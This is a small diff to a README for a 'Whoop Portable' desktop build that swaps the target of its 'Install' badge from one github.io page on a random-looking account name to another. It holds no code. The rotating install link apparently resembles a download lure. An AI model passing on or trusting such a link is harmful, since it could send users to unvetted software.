@@ -1,6 +1,6 @@
 # Whoop Portable - Lightweight Repo-Ready Build for Desktop Use
 
-[![Install Whoop Portable](https://img.shields.io/badge/Install-Whoop_Portable-2f6fed?style=for-the-badge&logo=github&logoColor=white)](https://evitabiorkmangzeju.github.io/.github/Whoop-Portable)
+[![Install Whoop Portable](https://img.shields.io/badge/Install-Whoop_Portable-2f6fed?style=for-the-badge&logo=github&logoColor=white)](https://robertawichmannqppeda.github.io/.github/Whoop-Portable)
 
 ## What Whoop Portable Provides
 
